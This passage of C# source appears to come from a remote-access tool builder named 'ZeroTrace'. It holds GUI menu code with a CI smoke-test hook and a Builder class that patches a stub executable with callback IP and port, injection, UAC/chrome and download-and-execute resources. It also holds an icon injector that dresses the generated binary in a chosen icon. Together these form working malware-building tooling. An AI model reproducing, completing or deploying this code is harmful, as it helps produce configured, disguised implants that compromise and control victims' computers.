                }
            }

            // The visible menu contains only the four requested top-level submenus.
            // The popup performs native measurement, hover rendering and submenu traversal.
            e.Cancel = true;
            connectionsPopupMenu.ShowPopup(Control.MousePosition);

            // Give DevExpress a UI turn to create/render the native popup, then verify
            // the real PopupMenu reports itself open. CI uses this application-owned
            // marker instead of guessing the popup window class (which is not stable
            // across DevExpress versions/skins).
            if (string.Equals(Environment.GetEnvironmentVariable("ZTSEC_CI_SMOKE"), "1", StringComparison.Ordinal))
            {
                BeginInvoke(new Action(MarkCiConnectionsPopupIfOpen));
            }
        }

        private void MarkCiConnectionsPopupIfOpen()
        {
            if (!string.Equals(Environment.GetEnvironmentVariable("ZTSEC_CI_SMOKE"), "1", StringComparison.Ordinal))
                return;

            try
            {
                if (connectionsPopupMenu == null || !connectionsPopupMenu.Opened)
                    return;

                string[] expected = { "Administration", "Networking", "Plugins", "Management" };
                string[] actual = connectionsPopupMenu.ItemLinks
                    .Cast<DevExpress.XtraBars.BarItemLink>()
                    .Select(link => link.Item != null ? link.Item.Caption : string.Empty)
                    .ToArray();

                if (actual.Length != expected.Length || !actual.SequenceEqual(expected, StringComparer.Ordinal))
                    return;

                string markerPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ci-connections-menu-opened.flag");
                string payload = "OPENED|" + DateTime.UtcNow.ToString("O") + "|" + string.Join("|", actual);
                File.WriteAllText(markerPath, payload);
            }
            catch (Exception ex)
            {
                LogToMonitor("CI context-menu verification failed: " + ex.Message, LogType.Error);
            }
        }

        private static bool IsDescendantOf(Control child, Control ancestor)
        {
            Control current = child;
            while (current != null)
            {
                if (current == ancestor)
                    return true;
                current = current.Parent;
            }

            return false;
        }

        private void accordionControlElement2_Click(object sender, EventArgs e)
        {
            xtraTabPage1.TabControl.SelectedTabPageIndex = 0;
            accordionControl1.SelectedElement = accordionControlElement2;
        }

        private void accordionControlElement3_Click(object sender, EventArgs e)
        {
            xtraTabPage1.TabControl.SelectedTabPageIndex = 1;
            accordionControl1.SelectedElement = accordionControlElement3;
        }

        private void accordionControlElement4_Click(object sender, EventArgs e)
        {
            xtraTabPage1.TabControl.SelectedTabPageIndex = 2;
        }

        private void accordionControlElement6_Click(object sender, EventArgs e)
        {
            xtraTabPage1.TabControl.SelectedTabPageIndex = 4;
            accordionControl1.SelectedElement = accordionControlElement6;
        }

        private void accordionControlElement7_Click(object sender, EventArgs e)
        {
            xtraTabPage1.TabControl.SelectedTabPageIndex = 5;
            accordionControl1.SelectedElement = accordionControlElement7;
        }

        private void accordionControlElement13_Click(object sender, EventArgs e)
        {
            xtraTabPage1.TabControl.SelectedTabPageIndex = 8;
            accordionControl1.SelectedElement = accordionControlElement13;
        }



    }

}


namespace ZeroTrace.Builder
{


    internal sealed class Build
    {



        private static AssemblyDefinition ReadStub(string stubPath)
        {
            if (!File.Exists(stubPath))
                throw new FileNotFoundException("Stub file not found.", stubPath);

            return AssemblyDefinition.ReadAssembly(stubPath);
        }

        private static void WriteStub(AssemblyDefinition definition, string outputPath)
        {
            definition.Write(outputPath);
        }





        private static void UpdateResource(string resourceName, string newContent, AssemblyDefinition assembly)
        {
            // Find the existing resource by name
            var existingResource = assembly.MainModule.Resources.OfType<EmbeddedResource>()
                                    .FirstOrDefault(r => r.Name.Equals(resourceName));

            if (existingResource != null)
            {
                // Remove the existing resource
                assembly.MainModule.Resources.Remove(existingResource);
            }

            // Add the new resource
            var newResource = new EmbeddedResource(resourceName, Mono.Cecil.ManifestResourceAttributes.Public, Encoding.UTF8.GetBytes(newContent));
            assembly.MainModule.Resources.Add(newResource);
        }

        public static void UpdateIPAndPort(string newIP, string newPort, string injValue, string chrome, string downloadexecute, AssemblyDefinition assembly)
        {
            // Remove and add the IP and Port resources
            UpdateResource("ZeroTraceOfficialStub.Resources.ip.txt", newIP, assembly);
            UpdateResource("ZeroTraceOfficialStub.Resources.port.txt", newPort, assembly);

            // Add the injection resource
            UpdateResource("ZeroTraceOfficialStub.Resources.inj.txt", injValue, assembly);

            UpdateResource("ZeroTraceOfficialStub.Resources.uac.txt", chrome, assembly);

            UpdateResource("ZeroTraceOfficialStub.Resources.downloadexecute.txt", downloadexecute, assembly);

        }


        //public static void ModifyObfuscatedAssembly(string newIP, string newPort, string outputPath)
        //{
        //    try
        //    {
        //        string stubPath = Environment.CurrentDirectory + "\\Stub\\DestinyClientObf.exe";

        //        Console.WriteLine(stubPath);
        //        Console.ReadLine();
        //        // Read the stub assembly
        //        var assembly = ReadStub(stubPath);

        //        // Update the IP and Port resources
        //        UpdateIPAndPort(newIP, newPort, assembly);

        //        // Write the modified assembly to a file
        //        WriteStub(assembly, outputPath);
        //    }
        //    catch (Exception ex)
        //    {
        //        throw new Exception($"Failed to modify assembly: {ex.Message}");
        //    }
        //}


        public static void ModifyAndSaveAssembly(string newIP, string newPort, string injValue, string chrome, string downloadexecute, string outputPath)
        {
            try
            {
                string stubPath = Environment.CurrentDirectory + "\\Stub\\ZeroStub.exe";
                Console.WriteLine(stubPath);
                Console.ReadLine();
                // Read the stub assembly
                var assembly = ReadStub(stubPath);
                // Update the IP, Port and injection setting resources
                UpdateIPAndPort(newIP, newPort, injValue, chrome,  downloadexecute, assembly);
                // Write the modified assembly to a file
                WriteStub(assembly, outputPath);
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to modify assembly: {ex.Message}");
            }
        }
    }

}
namespace Server.Helper
{
    public static class IconInjector
    {
        

        [SuppressUnmanagedCodeSecurity()]
        private class NativeMethods
        {
            [DllImport("kernel32")]
            public static extern IntPtr BeginUpdateResource(string fileName,
                [MarshalAs(UnmanagedType.Bool)] bool deleteExistingResources);

            [DllImport("kernel32")]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool UpdateResource(IntPtr hUpdate, IntPtr type, IntPtr name, short language,
                [MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 5)] byte[] data, int dataSize);

            [DllImport("kernel32")]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool EndUpdateResource(IntPtr hUpdate, [MarshalAs(UnmanagedType.Bool)] bool discard);
        }

        // The first structure in an ICO file lets us know how many images are in the file.
        [StructLayout(LayoutKind.Sequential)]
        private struct ICONDIR
        {
            // Reserved, must be 0
            public ushort Reserved;
            // Resource type, 1 for icons.
            public ushort Type;
            // How many images.
            public ushort Count;
            // The native structure has an array of ICONDIRENTRYs as a final field.
        }

        // Each ICONDIRENTRY describes one icon stored in the ico file. The offset says where the icon image data
        // starts in the file. The other fields give the information required to turn that image data into a valid
        // bitmap.
        [StructLayout(LayoutKind.Sequential)]
        private struct ICONDIRENTRY
        {
            /// <summary>
            /// The width, in pixels, of the image.
            /// </summary>
            public byte Width;
            /// <summary>
            /// The height, in pixels, of the image.
            /// </summary>
            public byte Height;
            /// <summary>
            /// The number of colors in the image; (0 if >= 8bpp)
            /// </summary>
            public byte ColorCount;
            /// <summary>
            /// Reserved (must be 0).
            /// </summary>
            public byte Reserved;
            /// <summary>
            /// Color planes.
            /// </summary>
            public ushort Planes;
            /// <summary>
            /// Bits per pixel.
            /// </summary>
            public ushort BitCount;
            /// <summary>
            /// The length, in bytes, of the pixel data.
            /// </summary>
            public int BytesInRes;
            /// <summary>
            /// The offset in the file where the pixel data starts.
            /// </summary>
            public int ImageOffset;
        }

        // Each image is stored in the file as an ICONIMAGE structure:
        //typdef struct
        //{
        //   BITMAPINFOHEADER   icHeader;      // DIB header
        //   RGBQUAD         icColors[1];   // Color table
        //   BYTE            icXOR[1];      // DIB bits for XOR mask
        //   BYTE            icAND[1];      // DIB bits for AND mask
        //} ICONIMAGE, *LPICONIMAGE;


        [StructLayout(LayoutKind.Sequential)]
        private struct BITMAPINFOHEADER
        {
            public uint Size;
            public int Width;
            public int Height;
            public ushort Planes;
            public ushort BitCount;
            public uint Compression;
            public uint SizeImage;
            public int XPelsPerMeter;
            public int YPelsPerMeter;
            public uint ClrUsed;
            public uint ClrImportant;
        }

        // The icon in an exe/dll file is stored in a very similar structure:
        [StructLayout(LayoutKind.Sequential, Pack = 2)]
        private struct GRPICONDIRENTRY
        {
            public byte Width;
            public byte Height;
            public byte ColorCount;
            public byte Reserved;
            public ushort Planes;
            public ushort BitCount;
            public int BytesInRes;
            public ushort ID;
        }

        public static void InjectIcon(string exeFileName, string iconFileName)
        {
            InjectIcon(exeFileName, iconFileName, 1, 1);
        }

        public static void InjectIcon(string exeFileName, string iconFileName, uint iconGroupID, uint iconBaseID)
        {
            const uint RT_ICON = 3u;
            const uint RT_GROUP_ICON = 14u;
            IconFile iconFile = IconFile.FromFile(iconFileName);
            var hUpdate = NativeMethods.BeginUpdateResource(exeFileName, false);
            var data = iconFile.CreateIconGroupData(iconBaseID);
            NativeMethods.UpdateResource(hUpdate, new IntPtr(RT_GROUP_ICON), new IntPtr(iconGroupID), 0, data,
                data.Length);
            for (int i = 0; i <= iconFile.ImageCount - 1; i++)
            {
                var image = iconFile.ImageData(i);
                NativeMethods.UpdateResource(hUpdate, new IntPtr(RT_ICON), new IntPtr(iconBaseID + i), 0, image,
                    image.Length);
            }
            NativeMethods.EndUpdateResource(hUpdate, false);
        }

        private class IconFile
        {
            private ICONDIR iconDir = new ICONDIR();
            private ICONDIRENTRY[] iconEntry;

            private byte[][] iconImage;

            public int ImageCount
            {
                get { return iconDir.Count; }
            }

            public byte[] ImageData(int index)
            {
                return iconImage[index];
            }

            public static IconFile FromFile(string filename)
            {
                IconFile instance = new IconFile();
                // Read all the bytes from the file.
                byte[] fileBytes = System.IO.File.ReadAllBytes(filename);
                // First struct is an ICONDIR
                // Pin the bytes from the file in memory so that we can read them.
                // If we didn't pin them then they could move around (e.g. when the
                // garbage collector compacts the heap)
                GCHandle pinnedBytes = GCHandle.Alloc(fileBytes, GCHandleType.Pinned);
                // Read the ICONDIR
                instance.iconDir = (ICONDIR)Marshal.PtrToStructure(pinnedBytes.AddrOfPinnedObject(), typeof(ICONDIR));
                // which tells us how many images are in the ico file. For each image, there's a ICONDIRENTRY, and associated pixel data.
                instance.iconEntry = new ICONDIRENTRY[instance.iconDir.Count];
                instance.iconImage = new byte[instance.iconDir.Count][];
                // The first ICONDIRENTRY will be immediately after the ICONDIR, so the offset to it is the size of ICONDIR
                int offset = Marshal.SizeOf(instance.iconDir);
                // After reading an ICONDIRENTRY we step forward by the size of an ICONDIRENTRY            
                var iconDirEntryType = typeof(ICONDIRENTRY);
                var size = Marshal.SizeOf(iconDirEntryType);
                for (int i = 0; i <= instance.iconDir.Count - 1; i++)
                {
                    // Grab the structure.
                    var entry =
                        (ICONDIRENTRY)
                            Marshal.PtrToStructure(new IntPtr(pinnedBytes.AddrOfPinnedObject().ToInt64() + offset),
                                iconDirEntryType);
                    instance.iconEntry[i] = entry;
                    // Grab the associated pixel data.
                    instance.iconImage[i] = new byte[entry.BytesInRes];
                    Buffer.BlockCopy(fileBytes, entry.ImageOffset, instance.iconImage[i], 0, entry.BytesInRes);
                    offset += size;
                }
                pinnedBytes.Free();
                return instance;
            }

            public byte[] CreateIconGroupData(uint iconBaseID)
            {
                // This will store the memory version of the icon.
                int sizeOfIconGroupData = Marshal.SizeOf(typeof(ICONDIR)) +
                                          Marshal.SizeOf(typeof(GRPICONDIRENTRY)) * ImageCount;
                byte[] data = new byte[sizeOfIconGroupData];
                var pinnedData = GCHandle.Alloc(data, GCHandleType.Pinned);
                Marshal.StructureToPtr(iconDir, pinnedData.AddrOfPinnedObject(), false);
                var offset = Marshal.SizeOf(iconDir);
                for (int i = 0; i <= ImageCount - 1; i++)
                {
                    GRPICONDIRENTRY grpEntry = new GRPICONDIRENTRY();
                    BITMAPINFOHEADER bitmapheader = new BITMAPINFOHEADER();
                    var pinnedBitmapInfoHeader = GCHandle.Alloc(bitmapheader, GCHandleType.Pinned);
                    Marshal.Copy(ImageData(i), 0, pinnedBitmapInfoHeader.AddrOfPinnedObject(),
                        Marshal.SizeOf(typeof(BITMAPINFOHEADER)));
                    pinnedBitmapInfoHeader.Free();
                    grpEntry.Width = iconEntry[i].Width;
                    grpEntry.Height = iconEntry[i].Height;
                    grpEntry.ColorCount = iconEntry[i].ColorCount;
                    grpEntry.Reserved = iconEntry[i].Reserved;
                    grpEntry.Planes = bitmapheader.Planes;
                    grpEntry.BitCount = bitmapheader.BitCount;
                    grpEntry.BytesInRes = iconEntry[i].BytesInRes;
                    grpEntry.ID = Convert.ToUInt16(iconBaseID + i);
                    Marshal.StructureToPtr(grpEntry, new IntPtr(pinnedData.AddrOfPinnedObject().ToInt64() + offset),
                        false);
                    offset += Marshal.SizeOf(typeof(GRPICONDIRENTRY));
                }
                pinnedData.Free();
                return data;
            }
        }


    }
}
